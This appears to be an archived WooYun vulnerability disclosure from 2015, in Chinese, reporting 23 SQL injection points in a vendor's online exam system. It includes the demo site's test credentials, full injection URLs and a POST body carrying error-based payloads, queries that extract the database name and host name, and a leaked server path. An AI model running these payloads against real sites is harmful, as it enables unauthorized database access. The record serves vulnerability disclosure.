{"id": 66781, "wybug_id": "wooyun-2015-0131622", "wybug_title": "天柏在线考试系统（企业版）SQL注入23处打包（demo测试）", "wybug_corp": "天柏科技", "wybug_author": "goubuli", "wybug_date": "2015-08-07 15:43", "wybug_open_date": "2015-11-05 13:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-05：\t细节向公众公开  简要描述： RT所有剩余注入打包提交 详细说明：  应审核要求，所有剩余注入打包提交\n厂商:上海天柏信息科技有限公司 官网：http://timber2005.com/ 案例：http://timber2005.com/Customer.html 企业版官方演示demo：http://exam1.timber2005.com 前台测试帐号：test1,test2,test3,test4,test5,test6 测试密码：123456 后台测试帐号：master 测试密码：123456\n\n\n案例（正式客户数：7783）：\n\ndemo演示【用户名/密码：test1/123456】 注入1、\nhttp://exam1.timber2005.com/Paper/Paper_Manage.aspx?action=view&infoid=303 and 1=user--\n\n\n注入2、\nhttp://exam1.timber2005.com/Paper/Paper_Type_Random_Query.aspx?return=../Paper/Paper_Query.aspx&pid=305 and 1=user--\n\n\n注入3、\nhttp://exam1.timber2005.com/Exam/Exam_Type_Right.aspx?infoid=35 and 1=user--\n\n\n注入4、\nhttp://exam1.timber2005.com/Question/Question_Manage.aspx?action=view&infoid=121)) and 1=user--\n稍微构造一下\nhttp://exam1.timber2005.com/Question/Question_Manage.aspx?action=view&infoid=121'\n\n\n注入5、\nhttp://exam1.timber2005.com/Question/Question_Type_Manage.aspx?action=view&infoid=3 and 1=user--\n\n\n注入6、\nhttp://exam1.timber2005.com/Question/Knowledge_Right.aspx?infoid=118 and 1=user--\n\n\n注入7、GET注入\nhttp://exam1.timber2005.com/system/Position_Right.aspx?infoid=21 and 1=user--\n\n\nPOST型注入\nhttp://exam1.timber2005.com/system/Position_Right.aspx\nPOST：\nPosition_Info1_treInfoList_ExpandState=nnnnn&Position_Info1_treInfoList_SelectedNode=&__EVENTTARGET=&__EVENTARGUMENT=&Position_Info1_treInfoList_PopulateLog=&__VIEWSTATE=%2FwEPDwUKLTkzNjcwODQ4MQ9kFgICAw9kFgQCEQ8PFgIeB1Zpc2libGVoZGQCFw9kFgICAQ88KwAJAgAPFgYeDU5ldmVyRXhwYW5kZWRkHgxTZWxlY3RlZE5vZGVkHglMYXN0SW5kZXgCBWQIFCsABgUTMDowLDA6MSwwOjIsMDozLDA6NBQrAAIWCB4EVGV4dAV26YOo6Zeo5Yqp55CGPGEgaHJlZj0nI3AnIHN0eWxlPSdtYXJnaW4tbGVmdDoxMHB4O2NvbG9yOnJlZDsnIG9uY2xpY2s9Im9rUFNCdXR0b25DbGljaygnMjEnLCfpg6jpl6jliqnnkIYnKSI%2B6YCJ5oupPC9hPh4FVmFsdWUFAjIxHghFeHBhbmRlZGceDFNlbGVjdEFjdGlvbgsqLlN5c3RlbS5XZWIuVUkuV2ViQ29udHJvbHMuVHJlZU5vZGVTZWxlY3RBY3Rpb24BZBQrAAIWCB8EBXzliqDmsrnnq5nnq5nplb88YSBocmVmPScjcCcgc3R5bGU9J21hcmdpbi1sZWZ0OjEwcHg7Y29sb3I6cmVkOycgb25jbGljaz0ib2tQU0J1dHRvbkNsaWNrKCcyNycsJ%2BWKoOayueermeermemVvycpIj7pgInmi6k8L2E%2BHwUFAjI3HwZnHwcLKwQBZBQrAAIWCB8EBXDliqDmsrnlkZg8YSBocmVmPScjcCcgc3R5bGU9J21hcmdpbi1sZWZ0OjEwcHg7Y29sb3I6cmVkOycgb25jbGljaz0ib2tQU0J1dHRvbkNsaWNrKCcyOScsJ%2BWKoOayueWRmCcpIj7pgInmi6k8L2E%2BHwUFAjI5HwZnHwcLKwQBZBQrAAIWCB8EBWrkuLvnrqE8YSBocmVmPScjcCcgc3R5bGU9J21hcmdpbi1sZWZ0OjEwcHg7Y29sb3I6cmVkOycgb25jbGljaz0ib2tQU0J1dHRvbkNsaWNrKCczNScsJ%2BS4u%2BeuoScpIj7pgInmi6k8L2E%2BHwUFAjM1HwZnHwcLKwQBZBQrAAIWCB8EBYIB5a6L5bCP5YGl55qE5bKX5L2NPGEgaHJlZj0nI3AnIHN0eWxlPSdtYXJnaW4tbGVmdDoxMHB4O2NvbG9yOnJlZDsnIG9uY2xpY2s9Im9rUFNCdXR0b25DbGljaygnMzYnLCflrovlsI%2FlgaXnmoTlspfkvY0nKSI%2B6YCJ5oupPC9hPh8FBQIzNh8GZx8HCysEAWRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBRpQb3NpdGlvbl9JbmZvMSR0cmVJbmZvTGlzdJcIgH6NkQGW%2B0oMhqZNOOfIgaCKdefVKhmgHykI%2FUqE&__VIEWSTATEGENERATOR=2622EB36&__EVENTVALIDATION=%2FwEdAAiTKBOi1XiDcXqUyV0SdyyXCfx%2BkHEsT%2Fq9JPrYUB%2BFFI7U3Vc0WZ%2BwxclqyPFfzmMGIljHegnqMccwcDBMgXY0WdwgR1KTjj%2Bb0f5EAac9YA3v4Ugp0DQCfDrVLkSvFLBnX1WvhHdrUgu82frszIAAF6nUgwMmppERt%2BrhodW6ghMy2CWvx%2Fwdyj0dvZFsVZ1LADeRpsvN6ySapYML0u7n&txtSearchText=12' and 1=user--&btnSearch=%E6%9F%A5%E8%AF%A2&P_PNAME=%24%E6%A0%B9%E8%8A%82%E7%82%B9&P_NAME=&P_SORT=&P_MARK=&P_PID=\n\n\n注入8、\nhttp://exam1.timber2005.com/system/Dep_Right.aspx?infoid=87 and 1=user--\n\n\n注入9、\nhttp://exam1.timber2005.com/exam/New_User_Exam_Single.aspx?wkey=SJ&planid=217&planname=231&time=10000&point=100&passpoint=60&module=%C3%A5%C2%8D%C2%95%C3%A5%C2%8D%C2%B7&pid=169&examkey='&ktypeid=&isanswer=%C3%A4%C2%B8%C2%8D%C3%A6%C2%98%C2%BE%C3%A7%C2%A4%C2%BA&return=User_Test_Query.aspx\n\n\n注入10、\nhttp://exam1.timber2005.com/exam/User_Test.aspx?wkey=GDSJ&planid=194&planname=df&time=10000&point=100&passpoint=60&module=%E6%95%B4%E5%8D%B7&pid=210&examkey='and 1=db_name()--&ktypeid=&isanswer=%E4%B8%8D%E6%98%BE%E7%A4%BA&return=User_Test_Query.aspx\n\n\n注入11、\nhttp://exam1.timber2005.com/exam/Labor_Exam_View.aspx?wkey=SJ&planid=256&planname=test&time=120&point=100&passpoint=60&module=%C3%A6%C2%95%C2%B4%C3%A5%C2%8D%C2%B7&pid=165&username=test1&usercnname=1&examkey=0424056D6B0A42A6A7' and 1=user--&userid=101&pager=1&resulturl=User_Exam_History_Query.aspx\n\n\n注入12、\nhttp://exam1.timber2005.com/exam/User_Exam_History_Card.aspx?examkey=29C04A631EDE4A21A8' and 1=@@version--\n\n\n注入13、\nhttp://exam1.timber2005.com/exam/User_Exam.aspx?wkey=GDSJ&planid=183 and 1=user--&planname=aaaaaaaaaaaaaaaaaaaaaaaa&time=100&point=20&passpoint=10&module=整卷&pid=198&examkey=4A7EF070347E4E8985&return=User_Exam_Reset_Query.aspx\n\n\n上午分开提交的洞被打回，要求打包一起发，这样提交比较累。。。今天挖的是企业版的洞，用户量应该比普通版的多。\n厂商:上海天柏信息科技有限公司 官网：http://timber2005.com/ 案例：http://timber2005.com/Customer.html 企业版官方演示demo：http://exam1.timber2005.com 前台测试帐号：test1,test2,test3,test4,test5,test6 测试密码：123456 后台测试帐号：master 测试密码：123456\n\n\n案例（正式客户数：7783）：\n\nDEMO演示【用户名/密码：master/123456】注入一、\n文件：User_Error_Exam.aspx参数：pid\nURL：\nhttp://exam1.timber2005.com/exam/User_Error_Exam.aspx?wkey=GDSJ&planid=183&planname=&time=100&point=20&passpoint=10&module=%E6%95%B4%E5%8D%B7&pid=198 and 1=user&username=master&usercnname=master1&examkey=14B2DD51FF54486AB2&userid=61\n\n\n注入二、\n文件：Vote_Result_View.aspx参数：infoid\nURL：\nhttp://exam1.timber2005.com/Info/Vote_Result_View.aspx?return=Vote_User.aspx&action=edit&infoid=9 and 1=user\n\n\n注入三、\n文件:Vote_User_Join.aspx参数：infoid\nURL：\nhttp://exam1.timber2005.com/Info/Vote_User_Join.aspx?infoid=9 and 1=user\n\n\n注入四、\n文件：Vote_Manage.aspx参数：infoid\nURL：\nhttp://exam1.timber2005.com/Info/Vote_Manage.aspx?action=view&infoid=9 and 1=user\n\n\n注入五、\n文件：Vote_Sub_Manage.aspx参数：infoid\nURL：\nhttp://exam1.timber2005.com/Info/Vote_Sub_Manage.aspx?infoid=9 and 1=user\n\n\n注入六、\n文件：Test_Manage.aspx参数：infoid\nURL：\nhttp://exam1.timber2005.com/Exam/Test_Manage.aspx?action=view&infoid=215 and 1=user\n\n\n注入七、\n文件：Exam_Persitence.aspx参数：infoid\nURL：\nhttp://exam1.timber2005.com/Exam/Exam_Persitence.aspx?action=limit&infoid=217 and 1=user&type=2\n\n\n注入八、\n文件：Plan_Manage.aspx参数：infoid\nURL：\nhttp://exam1.timber2005.com/Exam/Plan_Manage.aspx?action=view&infoid=260 and 1=user\n\n\n注入九、\n文件：Exam_Result_Role_Sub.aspx参数：roleid\nURL：\nhttp://exam1.timber2005.com/Exam/Exam_Result_Role_Sub.aspx?roleid=1 and 1=user--\n\n\n\nhttp://exam1.timber2005.com/Exam/Exam_Result_Role_Sub.aspx?roleid=1'\n\n\n注入十、\n文件：Exam_Persitence.aspx参数：infoid=265\nURL:\nhttp://exam1.timber2005.com/Exam/Exam_Persitence.aspx?action=limit&infoid=265 and 1=user--&type=1\n\n\n================================附送泄露路径：访问：\nhttp://exam1.timber2005.com/exam/User_Error_Exam.aspx?wkey=GDSJ&planid=183&planname=aaaaaaaaaaaaaaaaaaaaaaaa&time=100&point=20&passpoint=10&module=%E6%95%B4%E5%8D%B7&pid=198&username=master&usercnname=master1&examkey=14B2DD51FF54486AB2'&userid=61\n在examkey参数后加入'导致\n\n路径：\nD:\\公司演示网站\\V2014.09.01\\考试系统企业版\\compiled_web\\UpLoad\\ExamPaper\\183\\14B2DD51FF54486AB2'.exam\n手好累   漏洞证明：  上面已经证明上面已经证明，现在选取其中一个URL演示获取其他内容1、获取数据库名\nhttp://exam1.timber2005.com/Info/Vote_Sub_Manage.aspx?infoid=9 and 1=db_name()--\n\n\n2、获取机器名称\nhttp://exam1.timber2005.com/Info/Vote_Sub_Manage.aspx?infoid=9 and 1=host_name()--\n\n\n其他不在一一演示   修复方案：  过滤   版权声明：转载请注明来源 goubuli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-08-07 13:47 厂商回复： CNVD确认所述情况，已由CNVD通过软件生产厂商（或网站管理方）公开联系渠道向其邮件（和电话）通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-26 14:34 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1316 漏洞数:147        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  需要登录，然并卵    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}